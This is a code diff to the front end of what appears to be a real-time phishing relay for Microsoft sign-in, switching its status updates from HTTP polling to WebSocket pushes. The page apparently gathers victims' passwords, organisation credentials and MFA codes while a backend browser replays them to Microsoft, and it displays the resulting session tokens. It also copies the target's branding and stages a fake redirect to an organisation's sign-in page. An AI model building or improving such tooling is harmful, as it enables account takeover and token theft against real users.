@@ -708,6 +708,7 @@
   }
   .org-back-btn:hover { background: #f5f5f5; }
 </style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.5/socket.io.min.js"></script>
 </head>
 <body>
 
@@ -1096,7 +1097,9 @@ function renderMfaOptions(options) {
         // giving the server-side page a brief moment to actually render it.
         stopPolling();
         startWaitingLoader();
-        setTimeout(pollStatus, 600);
+        // Socket will push the next stage; one HTTP seed poll after a short delay
+        // to handle the race between MFA select and the next backend emit.
+        setTimeout(pollStatus, 400);
       } catch (err) {
         setStatus(err.message, "error");
         btn.disabled = false;
@@ -1107,8 +1110,15 @@ function renderMfaOptions(options) {
   mfaWaitingNote.style.display = options.length ? "none" : "block";
 }
 
-let pollHandle = null;
 let waitingLoaderActive = false;
+
+// ── WebSocket setup ────────────────────────────────────────────────────────
+const socket = io({ transports: ["websocket"], upgrade: false });
+
+socket.on("status", (data) => {
+  handleStatusData(data);
+});
+// ──────────────────────────────────────────────────────────────────────────
 
 function startWaitingLoader() {
   if (waitingLoaderActive) return;
@@ -1123,10 +1133,6 @@ function stopWaitingLoader() {
 }
 
 function stopPolling() {
-  if (pollHandle) {
-    clearTimeout(pollHandle);
-    pollHandle = null;
-  }
   stopWaitingLoader();
 }
 
@@ -1155,94 +1161,96 @@ function applyBranding(data) {
   }
 }
 
-async function pollStatus() {
+// Core status handler — called by the WebSocket push event.
+// Also used by the HTTP fallback (pollStatus) on initial connect.
+function handleStatusData(data) {
   if (!currentUsername) return;
 
+  applyBranding(data);
+
+  if (data.stage === "starting") {
+    // Firefox still launching — wait for next push
+  } else if (data.stage === "entering_password") {
+    if (!passwordSubmitted) {
+      stopWaitingLoader();
+      setBusy(usernameBtn, false, "Next");
+      setStatus("");
+      showScreen("password");
+      passwordInput.focus();
+    } else if (data.error) {
+      // Microsoft rejected the password — surface error and allow retry
+      stopWaitingLoader();
+      setBusy(passwordBtn, false, "Sign in");
+      passwordCancelBtn.style.display = "none";
+      setStatus(data.error, "error");
+      passwordSubmitted = false;
+      passwordInput.value = "";
+      passwordInput.focus();
+    }
+    // else: still typing password on the backend — keep loader running
+  } else if (data.stage === "awaiting_org_login") {
+    stopWaitingLoader();
+    setBusy(usernameBtn, false, "Next");
+    orgDomainNote.textContent = data.federated_domain
+      ? `This account uses your organization's sign-in page (${data.federated_domain}).`
+      : "This account uses your organization's sign-in page.";
+    showScreen("orgLogin");
+    orgRedirecting.style.display = "block";
+    orgPanel.style.display = "none";
+    setTimeout(() => {
+      orgRedirecting.style.display = "none";
+      orgPanel.style.display = "block";
+      setOrgStatus("Redirected to your organization's sign-in page.", "success");
+      orgEmail.value = currentUsername;
+      orgPassword.focus();
+    }, 1800);
+  } else if (data.stage === "awaiting_mfa_choice") {
+    stopWaitingLoader();
+    showScreen("mfaChoice");
+    renderMfaOptions(data.mfa_options || []);
+    setStatus("");
+  } else if (data.stage === "awaiting_mfa_code") {
+    stopWaitingLoader();
+    showScreen("mfaCode");
+    if (lastSelectedMfaOption) {
+      const lower = lastSelectedMfaOption.toLowerCase();
+      const numberMatch = lastSelectedMfaOption.match(/\+.*$/);
+      const number = numberMatch ? ` ${numberMatch[0]}.` : "";
+      if (lower.startsWith("call")) {
+        mfaCodeContextText.textContent = `We called your phone${number} Please enter the code to sign in.`;
+      } else if (lower.startsWith("text")) {
+        mfaCodeContextText.textContent = `We texted your phone${number} Please enter the code to sign in.`;
+      } else {
+        mfaCodeContextText.textContent = `Please enter your verification code to sign in.`;
+      }
+    }
+    setStatus("");
+    mfaCodeInput.focus();
+  } else if (data.stage === "succeeded") {
+    stopPolling();
+    showScreen("username");
+    setStatus("Authenticated successfully.", "success");
+    resultEl.style.display = "block";
+    resultEl.textContent = JSON.stringify(data.tokens, null, 2);
+    currentUsername = null;
+    usernameForm.reset();
+  } else if (data.stage === "failed") {
+    stopPolling();
+    showScreen("username");
+    setBusy(usernameBtn, false, "Next");
+    setStatus(data.error || "Authentication failed.", "error");
+    currentUsername = null;
+    resetBranding();
+  }
+}
+
+// HTTP fallback — called once after username submit to seed state in case
+// the socket join races with the first backend emit.
+async function pollStatus() {
+  if (!currentUsername) return;
   try {
     const data = await getJSON(`/login/status/${encodeURIComponent(currentUsername)}`);
-    applyBranding(data);
-
-    if (data.stage === "starting") {
-      // Firefox is still launching — keep polling, nothing to show yet
-    } else if (data.stage === "entering_password") {
-      if (!passwordSubmitted) {
-        stopWaitingLoader();
-        setBusy(usernameBtn, false, "Next");
-        setStatus("");
-        showScreen("password");
-        passwordInput.focus();
-      } else if (data.error) {
-        // Microsoft rejected the password — surface the error and allow retry
-        stopWaitingLoader();
-        setBusy(passwordBtn, false, "Sign in");
-        passwordCancelBtn.style.display = "none";
-        setStatus(data.error, "error");
-        passwordSubmitted = false;
-        passwordInput.value = "";
-        passwordInput.focus();
-      }
-      // else: passwordSubmitted && no error → backend still typing; keep loader running.
-    } else if (data.stage === "awaiting_org_login") {
-      stopWaitingLoader();
-      setBusy(usernameBtn, false, "Next");
-      orgDomainNote.textContent = data.federated_domain
-        ? `This account uses your organization's sign-in page (${data.federated_domain}).`
-        : "This account uses your organization's sign-in page.";
-      showScreen("orgLogin");
-      orgRedirecting.style.display = "block";
-      orgPanel.style.display = "none";
-      setTimeout(() => {
-        orgRedirecting.style.display = "none";
-        orgPanel.style.display = "block";
-        setOrgStatus("Redirected to your organization's sign-in page.", "success");
-        orgEmail.value = currentUsername;
-        orgPassword.focus();
-      }, 1800);
-    } else if (data.stage === "awaiting_mfa_choice") {
-      // Idle waiting for the user to pick a method — polling keeps running
-      // in the background (to catch a push approval), but nothing is
-      // actively in flight, so the loading bar shouldn't show here.
-      stopWaitingLoader();
-      showScreen("mfaChoice");
-      renderMfaOptions(data.mfa_options || []);
-      setStatus("");
-    } else if (data.stage === "awaiting_mfa_code") {
-      // Idle waiting for the user to type/receive a code — same reasoning
-      // as the MFA-choice screen above.
-      stopWaitingLoader();
-      showScreen("mfaCode");
-      if (lastSelectedMfaOption) {
-        const lower = lastSelectedMfaOption.toLowerCase();
-        const numberMatch = lastSelectedMfaOption.match(/\+.*$/);
-        const number = numberMatch ? ` ${numberMatch[0]}.` : "";
-        if (lower.startsWith("call")) {
-          mfaCodeContextText.textContent = `We called your phone${number} Please enter the code to sign in.`;
-        } else if (lower.startsWith("text")) {
-          mfaCodeContextText.textContent = `We texted your phone${number} Please enter the code to sign in.`;
-        } else {
-          mfaCodeContextText.textContent = `Please enter your verification code to sign in.`;
-        }
-      }
-      setStatus("");
-      mfaCodeInput.focus();
-    } else if (data.stage === "succeeded") {
-      stopPolling();
-      showScreen("username");
-      setStatus("Authenticated successfully.", "success");
-      resultEl.style.display = "block";
-      resultEl.textContent = JSON.stringify(data.tokens, null, 2);
-      currentUsername = null;
-      usernameForm.reset();
-      return;
-    } else if (data.stage === "failed") {
-      stopPolling();
-      showScreen("username");
-      setBusy(usernameBtn, false, "Next");
-      setStatus(data.error || "Authentication failed.", "error");
-      currentUsername = null;
-      resetBranding();
-      return;
-    }
+    handleStatusData(data);
   } catch (err) {
     stopPolling();
     showScreen("username");
@@ -1250,10 +1258,7 @@ async function pollStatus() {
     setStatus(err.message, "error");
     currentUsername = null;
     resetBranding();
-    return;
   }
-
-  pollHandle = setTimeout(pollStatus, 500);
 }
 
 usernameForm.addEventListener("submit", async (e) => {
@@ -1272,8 +1277,11 @@ usernameForm.addEventListener("submit", async (e) => {
       throw new Error(data.output || "Failed to start login.");
     }
     currentUsername = data.username || username;
-    // Start polling — the password screen appears when poll detects entering_password.
-    pollHandle = setTimeout(pollStatus, 500);
+    // Subscribe to push updates for this username via WebSocket.
+    socket.emit("join", { username: currentUsername });
+    // One HTTP poll as a fallback seed — handles the race where the
+    // socket join confirmation arrives after the first backend emit.
+    pollStatus();
   } catch (err) {
     stopWaitingLoader();
     setBusy(usernameBtn, false, "Next");
@@ -1330,6 +1338,7 @@ orgLoginForm.addEventListener("submit", async (e) => {
     orgPassword.value = "";
     setOrgStatus("");
     startWaitingLoader();
+    // Socket will push the next stage; one HTTP poll as fallback seed.
     pollStatus();
   } catch (err) {
     setOrgStatus(err.message, "error");
@@ -1385,13 +1394,10 @@ passwordForm.addEventListener("submit", async (e) => {
   passwordCancelBtn.style.display = "inline-block";
   try {
     await postJSON("/login/password", { username: currentUsername, password });
-    passwordSubmitted = true;   // tell pollStatus to keep the loader running
+    passwordSubmitted = true;   // tell handleStatusData to keep the loader running
     setStatus("Signing in...", "info", true);
     startWaitingLoader();
-    // pollStatus is already running; it will pick up the next stage automatically.
-    // Kick an extra poll immediately so there's no 1.5s dead-air gap.
-    if (pollHandle) { clearTimeout(pollHandle); pollHandle = null; }
-    pollStatus();
+    // Socket will push the next stage change immediately from the backend.
   } catch (err) {
     setStatus(err.message, "error");
     setBusy(passwordBtn, false, "Sign in");
